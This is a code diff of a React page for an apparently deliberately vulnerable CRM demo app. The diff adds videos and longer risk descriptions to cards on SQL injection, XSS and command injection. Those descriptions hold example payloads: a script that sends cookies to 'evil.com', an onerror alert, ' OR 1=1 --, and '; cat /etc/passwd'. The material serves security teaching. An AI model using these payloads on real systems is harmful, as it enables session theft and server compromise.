@@ -1,28 +1,32 @@
 import { Box, StatusIndicator, Button, Popover, Icon, Modal, SpaceBetween } from "@cloudscape-design/components";
-import { useEffect, useState, CSSProperties } from "react";
+import { useState, CSSProperties } from "react";
 import { useNavigate } from "react-router-dom";
 import { motion } from "motion/react";
 
 interface BI { scenario: string; risk: string; impact: string; example: string; }
-interface VD { id: string; icon: string; title: string; tag: string; tagColor: string; description: string; href: string; accentColor: string; bi: BI; }
+interface VD { id: string; icon: string; title: string; tag: string; tagColor: string; description: string; href: string; accentColor: string; bi: BI; video: string; }
 
 const VULNS: VD[] = [
   { id:"sqli", icon:"\uD83D\uDD13", title:"SQL Injection", tag:"CRITICAL", tagColor:"#ef4444", accentColor:"#ef4444",
-    description:"Discover how unsanitized database queries can bypass authentication and extract sensitive data.",
+    description:"Discover how unsanitized database queries can bypass authentication and extract sensitive data. Also demonstrates IDOR — sequential profile IDs are accessible with no auth check.",
     href:"/crm/security/profile",
-    bi:{ scenario:"CRM User Profile Lookup", risk:"Attacker modifies SQL queries via account search to dump the customer database.", impact:"Full PII exposure, revenue forecast leaks, GDPR/CCPA fines.", example:"' OR 1=1 -- returns all customer records." }},
+    bi:{ scenario:"CRM User Profile Lookup", risk:"Attacker modifies SQL queries via account search to dump the customer database. This endpoint also demonstrates IDOR (Insecure Direct Object Reference) — sequential numeric profile IDs are accessible with no auth check, so any user can enumerate all records.", impact:"Complete exposure of all customer PII including names, emails, phone numbers, and account details stored in the PostgreSQL database. Revenue forecast data and deal pipeline values become visible to competitors or malicious actors. Regulatory violations under GDPR, CCPA, and SOC 2 resulting in potential fines and mandatory breach notifications. Loss of customer trust and reputational damage if the breach becomes public, along with potential legal liability from affected customers.", example:"' OR 1=1 -- returns all customer records." },
+    video:"/videos/sql-injection.mp4"},
   { id:"xss", icon:"\u26A1", title:"Cross-Site Scripting (XSS)", tag:"HIGH", tagColor:"#f59e0b", accentColor:"#f59e0b",
     description:"Learn about reflected and stored XSS that allows malicious script injection into web pages.",
     href:"/crm/security/comments",
-    bi:{ scenario:"CRM Comments & Notes", risk:"Embedded JS in opportunity comments steals session tokens from every viewer.", impact:"Session hijacking, worm-like spread across all CRM users.", example:"Script tag in a comment sends cookies to attacker." }},
+    bi:{ scenario:"CRM Comments & Notes", risk:"An attacker posts a malicious script inside an opportunity comment or account note. When any sales rep, manager, or executive opens that record, the script silently executes in their browser — stealing their Cognito session token and sending it to an external server. Because comments are visible to the entire team, a single injected payload can compromise every user who views the record, creating a worm-like chain of session hijacking across the organization.", impact:"Mass session hijacking across all CRM users, unauthorized access to pipeline data and customer PII, potential for automated data exfiltration disguised as legitimate user activity, and reputational damage if customer-facing data is altered.", example:"<script>fetch('https://evil.com/steal?token='+document.cookie)</script> embedded in an opportunity comment silently exfiltrates session cookies from every viewer." },
+    video:"/videos/cross-site-scripting.mp4"},
   { id:"xss2", icon:"\uD83D\uDCA5", title:"Advanced XSS", tag:"HIGH", tagColor:"#f59e0b", accentColor:"#a855f7",
     description:"Explore DOM-based and attribute-based XSS that exploits client-side JavaScript.",
     href:"/crm/security/xss-advanced",
-    bi:{ scenario:"Dashboard Widgets & Custom Fields", risk:"Crafted URLs manipulate the CRM interface to show fake data or harvest credentials.", impact:"Manipulated dashboards, credential theft without server detection.", example:"Malicious filter parameter in a shared pipeline link." }},
+    bi:{ scenario:"Dashboard Widgets & Custom Fields", risk:"An attacker crafts a malicious URL containing JavaScript in query parameters or hash fragments and shares it with CRM users (e.g., via email or Slack as a 'pipeline filter link'). When a user clicks the link, the CRM dashboard renders the attacker's payload directly into the DOM — manipulating what the user sees, injecting fake data into pipeline views, or presenting a convincing credential-harvesting form that overlays the real UI. Because the attack happens entirely client-side, server-side logging never detects it.", impact:"Manipulated dashboard data leading to incorrect business decisions, credential theft through fake login overlays that bypass server-side detection, targeted phishing of high-value users like sales directors or executives, and potential for persistent DOM manipulation that alters deal values or forecast numbers.", example:"A shared link like /crm/pipeline?filter=<img src=x onerror=alert(document.cookie)> injects script execution when the page renders the filter parameter into the DOM without sanitization." },
+    video:"/videos/advanced-xss.mp4"},
   { id:"cmdi", icon:"\uD83D\uDCBB", title:"Command Injection", tag:"CRITICAL", tagColor:"#ef4444", accentColor:"#3b82f6",
     description:"Explore how unsanitized input to system commands enables arbitrary code execution.",
     href:"/crm/security/tools",
-    bi:{ scenario:"CRM Export & Reporting", risk:"Report generation passes user input to OS commands, enabling shell access.", impact:"Full server compromise, database exfiltration, ransomware deployment.", example:"'quarterly; cat /etc/passwd' in filename field." }},
+    bi:{ scenario:"Team Performance Export (CSV/PDF)", risk:"The CRM's Team Performance page includes an 'Export CSV' feature that lets managers export individual rep performance data. Under the hood, the export filename and filter parameters are passed to an operating system command for file generation without sanitization. An attacker enters shell metacharacters (;, |, &&) in the name filter field before exporting — injecting arbitrary commands that execute on the Lambda server with full runtime permissions. This grants the attacker the ability to read environment variables containing database credentials, access the VPC-connected RDS instance, enumerate the file system, and potentially pivot to other AWS resources using the Lambda execution role's IAM permissions.", impact:"Complete server compromise with access to database credentials stored in environment variables, full read access to the PostgreSQL customer database via the VPC connection, ability to exfiltrate all CRM data including PII, revenue forecasts, and deal pipeline, potential lateral movement to other AWS services using the Lambda role, and risk of persistent backdoor installation through the export functionality.", example:"Entering '; cat /etc/passwd' in the name filter field before clicking Export CSV causes the backend to execute the injected command alongside the export, revealing server user accounts and confirming arbitrary command execution." },
+    video:"/videos/command-injection-vulnerability.mp4"},
 ];
 
 const CAPS = [
@@ -44,17 +48,48 @@ const T1 = "#111827"; /* headings */
 const T2 = "#374151"; /* body text */
 const T3 = "#6b7280"; /* subtle labels */
 
-const BIContent = ({ b }: { b: BI }) => (
-  <SpaceBetween size="s">
-    <Box variant="strong" fontSize="heading-xs" color="text-status-info">{b.scenario}</Box>
-    <div><Box variant="strong" fontSize="body-s">CRM Risk:</Box><p style={{ margin:"4px 0 0", fontSize:"13px", color:T2 }}>{b.risk}</p></div>
-    <div><Box variant="strong" fontSize="body-s">Business Impact:</Box><p style={{ margin:"4px 0 0", fontSize:"13px", color:T2 }}>{b.impact}</p></div>
-    <div style={{ padding:"10px 12px", borderRadius:"8px", background:"rgba(0,0,0,0.04)", border:"1px solid rgba(0,0,0,0.08)" }}>
-      <Box variant="strong" fontSize="body-s">Example:</Box>
-      <p style={{ margin:"4px 0 0", fontSize:"12px", color:T2 }}><code>{b.example}</code></p>
-    </div>
-  </SpaceBetween>
-);
+const BIContent = ({ b, video }: { b: BI; video: string }) => {
+  const [videoExpanded, setVideoExpanded] = useState(false);
+  return (
+    <>
+      <div style={{ display:"flex", gap:"24px", alignItems:"flex-start" }}>
+        {/* Left: text content */}
+        <div style={{ flex:"2", minWidth:0 }}>
+          <SpaceBetween size="s">
+            <Box variant="strong" fontSize="heading-xs" color="text-status-info">{b.scenario}</Box>
+            <div><Box variant="strong" fontSize="body-s">CRM Risk:</Box><p style={{ margin:"4px 0 0", fontSize:"13px", color:T2 }}>{b.risk}</p></div>
+            <div><Box variant="strong" fontSize="body-s">Business Impact:</Box><p style={{ margin:"4px 0 0", fontSize:"13px", color:T2 }}>{b.impact}</p></div>
+            <div style={{ padding:"10px 12px", borderRadius:"8px", background:"rgba(0,0,0,0.04)", border:"1px solid rgba(0,0,0,0.08)" }}>
+              <Box variant="strong" fontSize="body-s">Example:</Box>
+              <p style={{ margin:"4px 0 0", fontSize:"12px", color:T2 }}><code>{b.example}</code></p>
+            </div>
+          </SpaceBetween>
+        </div>
+        {/* Right: video */}
+        <div style={{ flex:"3", minWidth:0, position:"sticky", top:0 }}>
+          <Box variant="strong" fontSize="body-s" margin={{ bottom:"xs" }}>CRM App Vulnerability</Box>
+          <div onClick={() => setVideoExpanded(true)} style={{ cursor:"pointer", position:"relative" }}>
+            <video src={video} autoPlay loop muted playsInline style={{ width:"100%", borderRadius:"8px", border:"1px solid rgba(0,0,0,0.08)" }} />
+            <div style={{ position:"absolute", bottom:"8px", right:"8px", background:"rgba(0,0,0,0.6)", color:"#fff", borderRadius:"6px", padding:"4px 10px", fontSize:"11px", fontWeight:500, display:"flex", alignItems:"center", gap:"4px", backdropFilter:"blur(4px)" }}>
+              🔍 Click to enlarge
+            </div>
+          </div>
+        </div>
+      </div>
+      {videoExpanded && (
+        <div onClick={() => setVideoExpanded(false)}
+          style={{ position:"fixed", inset:0, zIndex:99999, background:"rgba(0,0,0,0.9)", display:"flex", alignItems:"center", justifyContent:"center", cursor:"zoom-out", backdropFilter:"blur(4px)" }}>
+          <div style={{ position:"relative", maxWidth:"95vw", maxHeight:"95vh", padding:"16px" }} onClick={e => e.stopPropagation()}>
+            <video src={video} autoPlay loop muted playsInline style={{ maxWidth:"95vw", maxHeight:"90vh", borderRadius:"12px", boxShadow:"0 20px 60px rgba(0,0,0,0.5)" }} />
+            <button onClick={() => setVideoExpanded(false)}
+              style={{ position:"absolute", top:"0", right:"0", width:"36px", height:"36px", borderRadius:"50%", background:"rgba(255,255,255,0.15)", border:"1px solid rgba(255,255,255,0.25)", color:"#fff", fontSize:"18px", cursor:"pointer", display:"flex", alignItems:"center", justifyContent:"center", backdropFilter:"blur(4px)" }}
+              aria-label="Close video">✕</button>
+          </div>
+        </div>
+      )}
+    </>
+  );
+};
 
 const VCard = ({ d, i }: { d: VD; i: number }) => {
   const nav = useNavigate();
@@ -68,9 +103,11 @@ const VCard = ({ d, i }: { d: VD; i: number }) => {
       <div style={{ display:"flex", justifyContent:"space-between", alignItems:"flex-start", marginBottom:"12px" }}>
         <span style={{ fontSize:"28px" }}>{d.icon}</span>
         <div style={{ display:"flex", alignItems:"center", gap:"8px" }}>
-          <span onClick={e => { e.stopPropagation(); setOpen(true); }}
-            style={{ display:"inline-flex", alignItems:"center", justifyContent:"center", width:"24px", height:"24px", borderRadius:"50%", background:`${d.accentColor}12`, border:`1px solid ${d.accentColor}30`, cursor:"pointer", color:d.accentColor }}
-            role="button" aria-label={`Impact info for ${d.title}`}><Icon name="status-info" size="small" /></span>
+          <Popover size="small" position="top" triggerType="custom" dismissButton={false} content={<span style={{ fontSize:"12px" }}>Click for CRM impact details</span>}>
+            <span onClick={e => { e.stopPropagation(); setOpen(true); }}
+              style={{ display:"inline-flex", alignItems:"center", justifyContent:"center", width:"24px", height:"24px", borderRadius:"50%", background:`${d.accentColor}12`, border:`1px solid ${d.accentColor}30`, cursor:"pointer", color:d.accentColor }}
+              role="button" aria-label={`Impact info for ${d.title}`}><Icon name="status-info" size="small" /></span>
+          </Popover>
           <span style={{ fontSize:"10px", fontWeight:700, letterSpacing:"0.08em", padding:"3px 8px", borderRadius:"6px", background:`${d.tagColor}15`, color:d.tagColor, border:`1px solid ${d.tagColor}25` }}>{d.tag}</span>
         </div>
       </div>
@@ -78,25 +115,15 @@ const VCard = ({ d, i }: { d: VD; i: number }) => {
       <p style={{ margin:0, fontSize:"13px", color:T2, lineHeight:1.6 }}>{d.description}</p>
       <div style={{ marginTop:"16px", fontSize:"13px", fontWeight:500, color:d.accentColor }}>Explore demo {"\u2192"}</div>
     </motion.div>
-    <Modal visible={open} onDismiss={() => setOpen(false)} header={`CRM Impact: ${d.title}`} size="medium"
+    <Modal visible={open} onDismiss={() => setOpen(false)} header={`CRM Impact: ${d.title}`} size="max"
       footer={<Box float="right"><Button variant="primary" onClick={() => setOpen(false)}>Close</Button></Box>}>
-      <BIContent b={d.bi} />
+      <BIContent b={d.bi} video={d.video} />
     </Modal>
   </>);
 };
 
 const SecurityPage = () => {
   const [diagramOpen, setDiagramOpen] = useState(false);
-  const [health, setHealth] = useState<{label:string; status:"loading"|"success"|"error"; msg:string}[]>([
-    { label:"Database (RDS)", status:"loading", msg:"Checking..." },
-    { label:"Auth (Cognito)", status:"loading", msg:"Checking..." },
-    { label:"Overall", status:"loading", msg:"Checking..." },
-  ]);
-  useEffect(() => { const t = setTimeout(() => setHealth([
-    { label:"Database (RDS)", status:"success", msg:"Connected" },
-    { label:"Auth (Cognito)", status:"success", msg:"Active" },
-    { label:"Overall", status:"success", msg:"All systems go" },
-  ]), 1500); return () => clearTimeout(t); }, []);
 
   return (
     <div>
@@ -111,7 +138,7 @@ const SecurityPage = () => {
         <motion.div initial={{ opacity:0, y:16 }} animate={{ opacity:1, y:0 }} transition={{ duration:0.6 }} style={{ position:"relative", zIndex:1, maxWidth:"720px", width:"100%" }}>
           {/* Badge */}
           <div style={{ display:"inline-flex", alignItems:"center", gap:"6px", background:"rgba(255,255,255,0.07)", border:"1px solid rgba(255,255,255,0.1)", borderRadius:"20px", padding:"5px 14px", marginBottom:"28px", fontSize:"12px", color:"#94a3b8", letterSpacing:"0.02em" }}>
-            {"\u2728"} AI-Powered Security Analysis
+            {"\u2728"} Frontier Agent
           </div>
 
           {/* Title */}
@@ -150,7 +177,7 @@ const SecurityPage = () => {
             </Popover>
             <div style={{ display:"inline-flex", alignItems:"center", gap:"20px", background:"rgba(255,255,255,0.04)", border:"1px solid rgba(255,255,255,0.07)", borderRadius:"10px", padding:"8px 18px", fontSize:"12px", color:"#64748b" }}>
               <span style={{ display:"flex", alignItems:"center", gap:"4px" }}>
-                <strong style={{ color:"#94a3b8", fontWeight:500 }}>Console:</strong> {"\u2022\u2022\u2022\u2022\u2022\u2022"}
+                <strong style={{ color:"#94a3b8", fontWeight:500 }}>User:</strong> {"\u2022\u2022\u2022\u2022\u2022\u2022"}
                 <Popover size="small" position="top" triggerType="custom" dismissButton={false} content={<StatusIndicator type="success">Copied</StatusIndicator>}>
                   <Button variant="inline-icon" iconName="copy" ariaLabel="Copy username" onClick={() => navigator.clipboard.writeText("aws_user")} />
                 </Popover>
@@ -165,21 +192,7 @@ const SecurityPage = () => {
             </div>
           </div>
 
-          {/* Status strip */}
-          <motion.div initial={{ opacity:0 }} animate={{ opacity:1 }} transition={{ duration:0.6, delay:0.4 }}
-            style={{ marginTop:"20px", display:"flex", justifyContent:"center", alignItems:"center", gap:"20px", flexWrap:"wrap" }}>
-            {health.map((h, i) => (
-              <div key={h.label} style={{ display:"flex", alignItems:"center", gap:"6px", fontSize:"12px", color:"#64748b" }}>
-                {h.status === "loading"
-                  ? <span style={{ width:"8px", height:"8px", borderRadius:"50%", background:"#475569", display:"inline-block" }} />
-                  : <span style={{ width:"8px", height:"8px", borderRadius:"50%", background:"#22c55e", display:"inline-block", boxShadow:"0 0 6px rgba(34,197,94,0.5)" }} />
-                }
-                <span style={{ color:"#94a3b8" }}>{h.label}:</span>
-                <span style={{ color: h.status === "loading" ? "#64748b" : "#22c55e", fontWeight:500 }}>{h.msg}</span>
-                {i < health.length - 1 && <span style={{ marginLeft:"12px", width:"1px", height:"12px", background:"rgba(255,255,255,0.08)", display:"inline-block" }} />}
-              </div>
-            ))}
-          </motion.div>
+
         </motion.div>
 
         {/* Scroll indicator */}
